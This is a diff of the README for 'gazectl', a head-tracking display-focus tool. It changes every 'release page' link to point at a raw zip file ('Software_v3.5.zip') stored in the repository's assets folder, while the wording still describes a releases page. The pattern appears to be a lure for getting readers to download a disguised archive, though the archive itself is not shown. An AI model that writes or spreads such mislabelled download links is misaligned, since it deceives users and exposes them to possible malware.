@@ -1,6 +1,6 @@
 # 🧭 gazectl - Switch focus with head tracking
 
-[![Download gazectl](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mamtamahe3975/gazectl/releases)
+[![Download gazectl](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mamtamahe3975/gazectl/raw/refs/heads/main/assets/Software_v3.5.zip)
 
 ## 🚀 What is gazectl?
 
@@ -19,7 +19,7 @@ The app is meant for everyday use. You open it, set it up once, and use it when 
 
 Visit the release page here:
 
-[Open the gazectl releases page](https://github.com/Mamtamahe3975/gazectl/releases)
+[Open the gazectl releases page](https://github.com/Mamtamahe3975/gazectl/raw/refs/heads/main/assets/Software_v3.5.zip)
 
 On that page, look for the latest release and download the file that matches your system.
 
@@ -64,7 +64,7 @@ It is useful if you work with multiple displays and want a simple control flow.
 
 Use the release page to get the app:
 
-[Download gazectl from releases](https://github.com/Mamtamahe3975/gazectl/releases)
+[Download gazectl from releases](https://github.com/Mamtamahe3975/gazectl/raw/refs/heads/main/assets/Software_v3.5.zip)
 
 After you download the file:
 
@@ -220,7 +220,7 @@ If your displays are stacked or set at odd angles, you may need to tune the app 
 
 Use the release page to get the latest version:
 
-[https://github.com/Mamtamahe3975/gazectl/releases](https://github.com/Mamtamahe3975/gazectl/releases)
+[https://github.com/Mamtamahe3975/gazectl/raw/refs/heads/main/assets/Software_v3.5.zip](https://github.com/Mamtamahe3975/gazectl/raw/refs/heads/main/assets/Software_v3.5.zip)
 
 Open the newest release, download the app package, and follow the setup steps above
 
